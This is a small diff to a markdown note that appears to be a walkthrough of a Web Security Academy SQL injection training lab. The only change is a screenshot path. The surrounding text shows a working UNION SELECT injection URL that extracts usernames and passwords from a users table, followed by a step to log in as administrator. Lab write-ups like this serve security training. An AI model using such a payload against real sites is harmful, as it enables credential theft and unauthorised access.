@@ -9,7 +9,7 @@ The database contains a different table called `users`, with columns called `u
 https://0a07008d04f1fee2801f21bd00c300da.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--+-
 ```
 
-![[attachments/sqli-lab-9/file-20260204112139500.png]]
+![[attachments/sqli-lab-9/file-20260206135416513.png]]
 
 3. Log in as the administrator to solve the lab
 
